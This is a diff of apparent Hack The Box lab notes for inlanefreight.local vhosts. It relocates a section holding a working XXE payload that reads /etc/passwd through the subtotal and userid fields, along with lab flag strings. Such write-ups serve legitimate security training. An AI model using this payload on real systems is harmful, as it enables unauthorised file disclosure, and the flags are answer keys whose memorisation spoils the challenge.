@@ -584,6 +584,24 @@ discovered new vhost shopdev2.inlanefreight.local
 
 HTB{32596e8376077c3ef8d5cf52f15279ba}
 
+## shopdev2.inlanefreight.local
+
+all img
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <subtotal>&xxe;</subtotal>
+    <userid>&xxe;</userid>
+</root>
+
+```
+
+HTB{dbca4dc5d99cdb3311404ea74921553c}
+
 ## careers.inlanefreight.local
 
 HTB{8f40ecf17f681612246fa5728c159e46}
@@ -679,21 +697,7 @@ Table: company
 
 HTB{49f0bad299687c62334182178bfd75d8}
 
-## shopdev2.inlanefreight.local
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>
-    <subtotal>&xxe;</subtotal>
-    <userid>&xxe;</userid>
-</root>
-
-```
-
-HTB{dbca4dc5d99cdb3311404ea74921553c}
 
 ## support.inlanefreight.local
 
